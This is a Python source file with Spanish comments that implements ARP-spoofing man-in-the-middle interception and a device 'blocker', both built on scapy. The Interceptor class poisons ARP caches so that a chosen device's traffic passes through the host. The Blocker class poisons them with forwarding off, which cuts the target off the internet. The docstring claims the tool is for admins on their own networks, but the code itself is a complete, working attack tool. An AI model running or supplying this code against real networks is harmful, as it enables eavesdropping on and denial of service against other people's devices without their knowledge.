"""
mitm.py — Intercepcion selectiva por ARP spoofing.

Convierte este equipo en intermediario (man-in-the-middle) entre un dispositivo
objetivo y el router, para poder VER TODO su trafico. Disenado para que un
administrador inspeccione equipos de SU PROPIA red.

Diseno "bien hecho", no de prueba:
  - Intercepcion SELECTIVA (eliges que equipo inspeccionar), no toda la red a la
    vez. Spoofear la red entera es como se cae una red por accidente.
  - Reenvio de IP activado para NO cortarle internet al objetivo.
  - Restauracion automatica de las tablas ARP al detener o al cerrar el programa
    (la red queda sana, sin equipos "colgados").

USO LEGAL: solo en redes que administras o donde tienes permiso explicito.
"""

import time
import platform
import subprocess
import threading
import atexit


# --------------------------------------------------------------------------- #
#  Reenvio de IP (para no cortarle internet al objetivo)
# --------------------------------------------------------------------------- #
def enable_ip_forwarding():
    system = platform.system()
    try:
        if system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        elif system == "Darwin":  # macOS
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                           capture_output=True, timeout=5)
        elif system == "Windows":
            # Requiere admin. Puede necesitar reinicio la primera vez.
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                capture_output=True, timeout=5)
            subprocess.run(["sc", "config", "RemoteAccess", "start=", "auto"],
                           capture_output=True, timeout=5)
            subprocess.run(["net", "start", "RemoteAccess"],
                           capture_output=True, timeout=10)
    except Exception:
        pass


def disable_ip_forwarding():
    system = platform.system()
    try:
        if system == "Linux":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        elif system == "Darwin":
            subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"],
                           capture_output=True, timeout=5)
        elif system == "Windows":
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "0", "/f"],
                capture_output=True, timeout=5)
    except Exception:
        pass


# --------------------------------------------------------------------------- #
#  Interceptor
# --------------------------------------------------------------------------- #
class Interceptor:
    def __init__(self):
        self.targets = {}         # ip -> mac del objetivo
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_mac = None
        self._running = False
        self._thread = None
        self._lock = threading.Lock()

    # -- helpers scapy (import perezoso: no rompe si scapy/npcap falta) ------ #
    @staticmethod
    def _mac_of(ip, retries=3):
        from scapy.all import getmacbyip
        for _ in range(retries):
            try:
                mac = getmacbyip(ip)
                if mac:
                    return mac
            except Exception:
                pass
            time.sleep(0.4)
        return None

    def detect_gateway(self):
        from scapy.all import conf
        # conf.route.route devuelve (iface, ip_salida, gateway)
        return conf.route.route("0.0.0.0")[2]

    def _setup(self):
        from scapy.all import conf, get_if_hwaddr
        self.gateway_ip = self.detect_gateway()
        self.gateway_mac = self._mac_of(self.gateway_ip)
        try:
            self.my_mac = get_if_hwaddr(conf.iface)
        except Exception:
            self.my_mac = None
        if not self.gateway_mac:
            raise RuntimeError("No se pudo resolver la MAC del router (gateway).")

    # -- objetivos ---------------------------------------------------------- #
    def add_target(self, ip):
        mac = self._mac_of(ip)
        if not mac:
            return False
        with self._lock:
            self.targets[ip] = mac
        # spoof inmediato (varias rafagas) para que la intercepcion arranque ya
        if self.gateway_ip and self.gateway_mac:
            try:
                from scapy.all import ARP, send
                for _ in range(3):
                    send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip), verbose=0)
                    send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip), verbose=0)
                    time.sleep(0.2)
            except Exception:
                pass
        return True

    def remove_target(self, ip):
        with self._lock:
            mac = self.targets.pop(ip, None)
        if mac and self.gateway_ip and self.gateway_mac:
            self._restore(ip, mac)
        return mac is not None

    def list_targets(self):
        with self._lock:
            return list(self.targets.keys())

    def running(self):
        return self._running

    # -- spoofing ----------------------------------------------------------- #
    def _spoof_once(self):
        from scapy.all import ARP, send
        with self._lock:
            items = list(self.targets.items())
        for ip, mac in items:
            # Al objetivo: "yo (router) estoy en mi_mac"
            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip),
                 verbose=0)
            # Al router: "yo (objetivo) estoy en mi_mac"
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=ip),
                 verbose=0)

    def _restore(self, ip, mac):
        """Reenvia las asociaciones ARP correctas para sanar la red."""
        from scapy.all import ARP, send
        for _ in range(5):
            send(ARP(op=2, pdst=ip, hwdst=mac,
                     psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=0)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                     psrc=ip, hwsrc=mac), verbose=0)
            time.sleep(0.2)

    # -- ciclo de vida ------------------------------------------------------ #
    def start(self):
        if self._running:
            return
        self._setup()
        enable_ip_forwarding()
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        atexit.register(self.stop)

    def _loop(self):
        while self._running:
            try:
                self._spoof_once()
            except Exception:
                pass
            time.sleep(1.2)

    def stop(self):
        if not self._running:
            return
        self._running = False
        with self._lock:
            items = list(self.targets.items())
            self.targets.clear()
        for ip, mac in items:
            try:
                self._restore(ip, mac)
            except Exception:
                pass
        disable_ip_forwarding()


# instancia global
interceptor = Interceptor()


# =========================================================================== #
#  Blocker - corta el acceso a internet de un equipo (ARP sin reenvio)
# =========================================================================== #
class Blocker:
    """
    Bloquea el acceso a internet de un equipo: le dice (por ARP) que el router
    esta en la MAC de este equipo, pero NO reenvia -> su trafico al router se
    pierde. Se revierte al desbloquear o cerrar.
    """
    def __init__(self):
        self.targets = {}       # ip -> mac
        self.gateway_ip = None
        self.gateway_mac = None
        self._running = False
        self._thread = None
        self._lock = threading.Lock()

    def _setup(self):
        from scapy.all import conf
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = Interceptor._mac_of(self.gateway_ip)
        if not self.gateway_mac:
            raise RuntimeError("No se pudo resolver la MAC del router.")

    def block(self, ip):
        mac = Interceptor._mac_of(ip)
        if not mac:
            return False
        if not self._running:
            self._setup()
            disable_ip_forwarding()   # importante: sin reenvio para que se corte
            self._running = True
            self._thread = threading.Thread(target=self._loop, daemon=True)
            self._thread.start()
            atexit.register(self.stop)
        with self._lock:
            self.targets[ip] = mac
        return True

    def unblock(self, ip):
        with self._lock:
            mac = self.targets.pop(ip, None)
        if mac and self.gateway_ip and self.gateway_mac:
            from scapy.all import ARP, send
            for _ in range(5):
                send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=0)
                time.sleep(0.2)
        if not self.list_targets():
            self.stop()
        return mac is not None

    def list_targets(self):
        with self._lock:
            return list(self.targets.keys())

    def _loop(self):
        from scapy.all import ARP, send
        while self._running:
            with self._lock:
                items = list(self.targets.items())
            for ip, mac in items:
                try:
                    send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip), verbose=0)
                except Exception:
                    pass
            time.sleep(1.2)

    def stop(self):
        self._running = False
        # Sanar la red: devolver a cada equipo su asociacion ARP correcta,
        # si no lo hacemos se quedan sin internet hasta que caduque su cache.
        with self._lock:
            items = list(self.targets.items())
            self.targets.clear()
        if self.gateway_ip and self.gateway_mac:
            try:
                from scapy.all import ARP, send
                for ip, mac in items:
                    for _ in range(5):
                        send(ARP(op=2, pdst=ip, hwdst=mac,
                                 psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                             verbose=0)
                        time.sleep(0.1)
            except Exception:
                pass


blocker = Blocker()
